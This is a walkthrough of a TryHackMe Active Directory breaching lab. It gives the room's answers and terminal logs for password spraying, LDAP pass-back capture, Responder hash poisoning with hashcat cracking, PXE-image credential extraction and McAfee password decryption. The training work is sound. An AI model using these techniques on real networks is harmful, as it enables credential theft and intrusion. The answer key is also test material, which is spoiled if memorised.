# Breaching Active Directory

## Task 1  Introduction to AD Breaches
+ I have completed the AD basics room and am ready to learn about AD breaching techniques.
+ I have connected to the network and configured DNS.

## Task 2  OSINT and Phishing
+ I understand OSINT and how it can be used to breach AD
+ I understand Phishing and how it can be used to breach AD
+ What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach? `HaveIBeenPwned`

## Task 3  NTLM Authenticated Services
+ What is the name of the challenge-response authentication mechanism that uses NTLM?`NetNTLM`
+ What is the username of the third valid credential pair found by the password spraying script?`gordon.stevens`
+ How many valid credentials pairs were found by the password spraying script? `4`
+ What is the message displayed by the web application when authenticating with a valid credential pair? `Hello World`
- Brute Force 
    ```bash
    root@ip-10-10-81-120:~/Rooms/BreachingAD/task3# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
    [*] Starting passwords spray attack using the following password: Changeme123
    [-] Failed login with Username: anthony.reynolds
    [-] Failed login with Username: samantha.thompson
    [-] Failed login with Username: dawn.turner
    [-] Failed login with Username: frances.chapman
    [-] Failed login with Username: henry.taylor
    [-] Failed login with Username: jennifer.wood
    [+] Valid credential pair found! Username: hollie.powell Password: Changeme123
    [-] Failed login with Username: louise.talbot
    [+] Valid credential pair found! Username: heather.smith Password: Changeme123
    [-] Failed login with Username: dominic.elliott
    [+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
    [-] Failed login with Username: alan.jones
    [-] Failed login with Username: frank.fletcher
    [-] Failed login with Username: maria.sheppard
    [-] Failed login with Username: sophie.blackburn
    [-] Failed login with Username: dawn.hughes
    [-] Failed login with Username: henry.black
    [-] Failed login with Username: joanne.davies
    [-] Failed login with Username: mark.oconnor
    [+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
    [*] Password spray attack completed, 4 valid credential pairs found
    ```

## Task 4  LDAP Bind Credentials
+ What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?`LDAP Pass-back attack`
+ What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?`LOGIN,PLAIN`
+ What is the password associated with the svcLDAP account?`tryhackmeldappass1@`

- Loot creds `za.tryhackme.com\svcLDAP:tryhackmeldappass1@`
```bash
root@ip-10-10-81-120:~/Rooms/BreachingAD/task3# sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on breachad, link-type RAW (Raw IP), capture size 262144 bytes
[...More Stuff....]
	0x0000:  4500 0069 641b 4000 7f06 17aa 0ac8 36c9  E..id.@.......6.
	0x0010:  0a32 3407 fb4a 0185 1d04 586c f49a 53eb  .24..J....Xl..S.
	0x0020:  5018 2019 8245 0000 3084 0000 003b 0201  P....E..0....;..
	0x0030:  0860 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
	0x0060:  6461 7070 6173 7331 40                   dappass1@
06:06:54.965142 IP ip-10-50-52-7.eu-west-1.compute.internal.ldap > ip-10-200-54-201.eu-west-1.compute.internal.64330: Flags [.], ack 486824109, win 502, length 0
	0x0000:  4500 0028 3c66 4000 4006 7ea0 0a32 3407  E..(<f@.@.~..24.
	0x0010:  0ac8 36c9 0185 fb4a f49a 53eb 1d04 58ad  ..6....J..S...X.
	0x0020:  5010 01f6 730d 0000                      P...s...
[...More Stuff....]
```

## Task 5  Authentication Relays
+ What is the name of the tool we can use to poison and capture authentication requests on the network? `responder`
+ What is the username associated with the challenge that was captured?
+ What is the value of the cracked password associated with the challenge that was captured?


- Poisoning NTLM using responder
```bash
root@ip-10-10-81-120:~/Rooms/BreachingAD/task3# responder -I breachad
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
[SMB] NTLMv2-SSP Client   : ::ffff:10.200.54.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:a26379433f911ff0:43B4A77B64CE370B0A1BD91085BDA31F:01010000000000000072404E1F45DA01299FC52DA1EE8E4B000000000200080041004A005100450001001E00570049004E002D005A0036005700580034004E004300350045004700490004003400570049004E002D005A0036005700580034004E00430035004500470049002E0041004A00510045002E004C004F00430041004C000300140041004A00510045002E004C004F00430041004C000500140041004A00510045002E004C004F00430041004C00070008000072404E1F45DA010600040002000000080030003000000000000000000000000020000008151CB55B6F6D4C6C5F771D1705CA97EDD8413DD9C6F2620AD752223E4C209E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00350032002E0037000000000000000000
```

- Cracking Hash 
```bash
root@ip-10-10-81-120:~/Rooms/BreachingAD/task5# hashcat -m 5600 hash.txt passwordlist.txt --force
hashcat (v6.1.1-66-g6a419d06) starting...

SVCFILECOPY::ZA:a26379433f911ff0:43b4a77b64ce370b0a1bd91085bda31f:01010000000000000072404e1f45da01299fc52da1ee8e4b000000000200080041004a005100450001001e00570049004e002d005a0036005700580034004e004300350045004700490004003400570049004e002d005a0036005700580034004e00430035004500470049002e0041004a00510045002e004c004f00430041004c000300140041004a00510045002e004c004f00430041004c000500140041004a00510045002e004c004f00430041004c00070008000072404e1f45da010600040002000000080030003000000000000000000000000020000008151cb55b6f6d4c6c5f771d1705ca97edd8413dd9c6f2620ad752223e4c209e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00350030002e00350032002e0037000000000000000000:FPassword1!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SVCFILECOPY::ZA:a26379433f911ff0:43b4a77b64ce370b0a...000000
Time.Started.....: Fri Jan 12 06:29:32 2024, (0 secs)
Time.Estimated...: Fri Jan 12 06:29:32 2024, (0 secs)
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   467.5 kH/s (0.84ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 513/513 (100.00%)
Rejected.........: 0/513 (0.00%)
Restore.Point....: 0/513 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> hockey
```

## Task 6  Microsoft Deployment Toolkit
+ What Microsoft tool is used to create and host PXE Boot images in organisations? `Microsoft Deployment Toolkit`
+ What network protocol is used for recovery of files from the MDT server? `tftp`
+ What is the username associated with the account that was stored in the PXE Boot image?
+ What is the password associated with the account that was stored in the PXE Boot image?


```html
pxeboot.za.tryhackme.com - /
1/12/2024  5:24 AM         8192 arm64{4816C302-B740-4842-8132-51256A2FA9E6}.bcd
1/12/2024  5:24 AM         8192 arm{2B5D3DE4-61A0-46B8-9764-BB735F66CB75}.bcd
3/4/2022   8:41 PM          213 web.config
1/12/2024  5:24 AM        12288 x64uefi{DA3C77A3-F3A1-4FCD-BC95-A6E6389984DD}.bcd
1/12/2024  5:24 AM        12288 x64{2CE8BDEC-6960-4C85-837F-B2C62BC91943}.bcd
1/12/2024  5:24 AM         8192 x86uefi{FE45AFA4-E8B8-4229-B92D-91270A6A1117}.bcd
1/12/2024  5:24 AM        12288 x86x64{34AA2A14-365C-46E3-A7C2-A69895C5414F}.bcd
1/12/2024  5:24 AM         8192 x86{0F829316-B55C-45BB-BB3D-7620D4675A02}.bcd
```

```bash
thm@THMJMP1 C:\Users\thm\Documents>copy C:\powerpxe lodwig\ 
C:\powerpxe\LICENSE 
C:\powerpxe\PowerPXE.ps1 
C:\powerpxe\README.md
        3 file(s) copied.

thm@THMJMP1 C:\Users\thm\Documents\lodwig>tftp -i 10.200.54.202 GET "\Tmp\x64{2CE8BDEC-6960-4C85-837F-B2C62BC91943}.bcd"
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s

thm@THMJMP1 C:\Users\thm\Documents\lodwig>powershell -executionpolicy bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\lodwig> Import-Module .\PowerPXE.ps1 
PS C:\Users\thm\Documents\lodwig> Get-WimFile -bcdFile "x64{2CE8BDEC-6960-4C85-837F-B2C62BC91943}.bcd"
>> Parse the BCD file: x64{2CE8BDEC-6960-4C85-837F-B2C62BC91943}.bcd 
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim 
\Boot\x64\Images\LiteTouchPE_x64.wim

PS C:\Users\thm\Documents\lodwig>tftp -i 10.200.54.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
Transfer successful: 341899611 bytes in 290 second(s), 1178964 bytes/s

PS C:\Users\thm\Documents\lodwig>Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT 
>>>> >>>> UserDomain = ZA 
>>>> >>>> UserPassword = PXEBootSecure1@ 
```

## Task 7  Configuration Files
+ What type of files often contain stored credentials on hosts? `configuration files`
+ What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator? `ma.db`
+ What table in this database stores the credentials of the orchestrator? `AGENT_REPOSITORIES`
+ What is the username of the AD account associated with the McAfee service?`svcAV`
+ What is the password of the AD account associated with the McAfee service? `MyStrongPassword!`

```bash
root@ip-10-10-81-120:~/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
root@ip-10-10-81-120:~/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master# sqlitebrowser ma.db

AUTH_PASSWD:jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
AUTH_USER:svcAV
za.tryhackme.com

root@ip-10-10-81-120:~/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master# python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```

